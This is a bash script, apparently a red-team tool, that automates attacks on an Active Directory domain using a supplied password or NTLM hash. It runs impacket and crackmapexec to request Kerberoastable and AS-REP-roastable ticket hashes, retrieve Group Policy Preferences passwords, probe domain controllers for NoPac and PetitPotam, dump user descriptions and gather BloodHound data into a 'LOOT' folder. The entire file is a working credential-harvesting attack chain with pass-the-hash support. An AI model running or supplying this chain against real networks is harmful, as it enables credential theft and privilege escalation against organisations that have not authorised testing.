#!/bin/bash

# Define color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' # No color

function print_usage() {
    echo -e "Usage: $0 -d <${YELLOW}domain${NC}> [-p <${YELLOW}password${NC}> | -H <${YELLOW}hash${NC}>] -u <${YELLOW}user${NC}> -D <${YELLOW}DCIP${NC}> [-T <${YELLOW}targets_file${NC}>]"
    echo -e "Example: $0 -d example.com -u john.doe -p Pass123! -D 192.168.1.10"
}

# SECTION: Dependency Check and Installation

function check_and_install_dependencies() {
    # Check if running with sudo
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}Please run this script with sudo or as root.${NC}"
        exit 1
    fi

    # Check if crackmapexec is installed
    if ! command -v crackmapexec &>/dev/null; then
        echo -e "${YELLOW}crackmapexec${NC} not found. Installing..."
        apt update
        apt install -y crackmapexec
    else
        echo -e "${GREEN}crackmapexec is already installed.${NC}"
    fi

    # Check if impacket is installed
    if ! python3 -c "import impacket" &>/dev/null; then
        echo -e "${YELLOW}impacket${NC} not found. Installing..."
        apt update
        apt install -y python3-impacket
    else
        echo -e "${GREEN}impacket is already installed.${NC}"
    fi

    # Check if bloodhound-python is installed
    if ! python3 -c "import bloodhound" &>/dev/null; then
        echo -e "${YELLOW}bloodhound-python${NC} not found. Installing..."
        pip3 install bloodhound
    else
        echo -e "${GREEN}bloodhound-python is already installed.${NC}"
    fi

    echo -e "${GREEN}Dependency check and installation completed.${NC}"
}

# SECTION: Input Validation

function check_required_options() {
    if [ -z "$domain" ] || [ -z "$user" ] || [ -z "$DCIP" ]; then
        echo -e "${RED}Error: Missing required options.${NC}"
        print_usage
        exit 1
    fi

    # Check if either password or hash is provided
    if [ -z "$password" ] && [ -z "$hash" ]; then
        echo -e "${RED}Error: Missing authentication credentials. Provide either -p <password> or -H <hash>.${NC}"
        print_usage
        exit 1
    fi

    # Check if both password and hash are provided (not allowed)
    if [ ! -z "$password" ] && [ ! -z "$hash" ]; then
        echo -e "${RED}Error: Provide either -p <password> or -H <hash>, not both.${NC}"
        print_usage
        exit 1
    fi
}

# SECTION: AD Checks

function checkforKerberoasting() {
    if [ ! -z "$password" ]; then
        impacket-GetUserSPNs "$domain/$user:$password" -request -dc-ip "$DCIP" | tee LOOT/Kerberoastable.txt
    elif [ ! -z "$hash" ]; then
        impacket-GetUserSPNs "$domain/$user" -hashes ":$hash" -request -dc-ip "$DCIP" | tee LOOT/Kerberoastable.txt
    fi
}

function checkforAsRepRoasting() {
    if [ ! -z "$password" ]; then
        impacket-GetNPUsers "$domain/$user:$password" -request -dc-ip "$DCIP" | tee LOOT/Asreproastable.txt
    elif [ ! -z "$hash" ]; then
        impacket-GetNPUsers "$domain/$user" -hashes ":$hash" -request -dc-ip "$DCIP" | tee LOOT/Asreproastable.txt
    fi
}

function checkforGPP() {
    if [ ! -z "$password" ]; then
        impacket-Get-GPPPassword "$domain/$user:$password@$DCIP"
    elif [ ! -z "$hash" ]; then
        impacket-Get-GPPPassword "$domain/$user@$DCIP" -hashes ":$hash"
    fi
}

function checkforNoPac() {
    if [ ! -z "$password" ]; then
        if [ ! -z "$DCTargets" ]; then
            crackmapexec smb "$DCTargets" -u "$user" -p "$password" -M "nopac" | tee LOOT/NoPACcheck.txt
        else
            crackmapexec smb "$DCIP" -u "$user" -p "$password" -M "nopac" | tee LOOT/NoPACcheck.txt
        fi
    elif [ ! -z "$hash" ]; then
        if [ ! -z "$DCTargets" ]; then
            crackmapexec smb "$DCTargets" -u "$user" -H "$hash" -M "nopac" | tee LOOT/NoPACcheck.txt
        else
            crackmapexec smb "$DCIP" -u "$user" -H "$hash" -M "nopac" | tee LOOT/NoPACcheck.txt
        fi
    fi
}

function checkforPetitPotam() {
    if [ ! -z "$password" ]; then
        crackmapexec smb "$DCIP" -u "$user" -p "$password" -M "petitpotam" | tee LOOT/PetitPotamcheck.txt
    elif [ ! -z "$hash" ]; then
        crackmapexec smb "$DCIP" -u "$user" -H "$hash" -M "petitpotam" | tee LOOT/PetitPotamcheck.txt
    fi
}

function Runbloodhound-python() {
    # Obtain the DCHOSTNAME using crackmapexec
    DCHOSTNAME=$(crackmapexec smb "$DCIP" | awk '{print $4}')

    # Use the provided authentication credentials for bloodhound-python
    if [ ! -z "$password" ]; then
        bloodhound-python -u "$user" -p "$password" -d "$domain" -dc "$DCHOSTNAME.$domain" -ns "$DCIP" -c all
    elif [ ! -z "$hash" ]; then
        bloodhound-python -u "$user" --hashes "aad3b435b51404eeaad3b435b51404ee:$hash" -d "$domain" -dc "$DCHOSTNAME.$domain" -ns "$DCIP" -c all
    fi
    echo  # Add a blank line after the function output
    mkdir -p LOOT/BloodhoundData/
    mv *.json LOOT/BloodhoundData/
}

function grabbinguserdescriptions() {
    #Attempting to use CME to grab user descriptions
    DCHOSTNAME=$(crackmapexec smb "$DCIP" | awk '{print $4}')
    if [ ! -z "$password" ]; then
        convertedpass=$(echo -n "$password" | iconv -t utf16le | openssl dgst -md4 | awk '{print $2}' | tr '[:lower:]' '[:upper:]')
        crackmapexec smb "$DCIP" -u "$user" -H "$convertedpass" --users | grep $domain | awk -F"$DCHOSTNAME" '{print $2}' | tee LOOT/Userdescriptions.txt
    elif [ ! -z "$hash" ]; then
        crackmapexec smb "$DCIP" -u "$user" -H "$hash" --users | grep $domain | awk -F"$DCHOSTNAME" '{print $2}' | tee LOOT/Userdescriptions.txt
    fi
}

function makelootfolder() {
    mkdir -p LOOT
}
function usage() {
    echo -e "Usage: $0 -d <${YELLOW}domain${NC}> [-p <${YELLOW}password${NC}> | -H <${YELLOW}hash${NC}>] -u <${YELLOW}user${NC}> -D <${YELLOW}DCIP${NC}> [-T <${YELLOW}DCTargets${NC}>]"
    echo -e "Options:"
    echo -e "  -d, --domain <domain>          Domain name"
    echo -e "  -p, --password <password>      User password (optional if hash is provided)"
    echo -e "  -H, --hash <hash>              User NTLM hash (optional if password is provided)"
    echo -e "  -u, --user <username>          Username"
    echo -e "  -D, --DCIP <DC_IP>             Domain Controller IP address"
    echo -e "  -T, --DCTargets <file>         File containing multiple Domain Controller IPs for CVE Checks(optional)"
    echo -e "  -h, --help                     Display this help and exit"
}
function print_usage() {
    usage
    exit 1
}
# SECTION: Main Execution

# Parse command-line options
while getopts "d:p:H:u:D:T:h" opt; do
    case $opt in
        d) domain=$OPTARG;;
        p) password=$OPTARG;;
        H) hash=$OPTARG;;
        u) user=$OPTARG;;
        D) DCIP=$OPTARG;;
        T) DCTargets=$OPTARG;;
        h) usage
          exit 0;;
        ?) print_usage
           exit 1;;
    esac
done

# Check required options and authentication method
check_required_options

# Call the function to check and install dependencies
check_and_install_dependencies

# Call the other check functions as needed
makelootfolder
echo -e "${GREEN}Creating LOOT Folder${NC}"
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo -e "${GREEN}Searching for Kerberoastable Accounts${NC}"
checkforKerberoasting
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo -e "${GREEN}Searching for Asrep-Roastable Accounts${NC}"
checkforAsRepRoasting
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo -e "${GREEN}Checking for GPP${NC}"
checkforGPP
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo -e "${GREEN}Checking for CVEs, NoPac and PetitPotam${NC}"
checkforNoPac
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
checkforPetitPotam
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo -e "${GREEN}Attempting to enumerate User Descriptions${NC}"
grabbinguserdescriptions
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo -e "${GREEN}Running Bloodhound${NC}"
Runbloodhound-python
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo  # Add a blank line after each function output
echo -e "${GREEN}Checks completed. All Files saved in LOOT Directory${NC}"
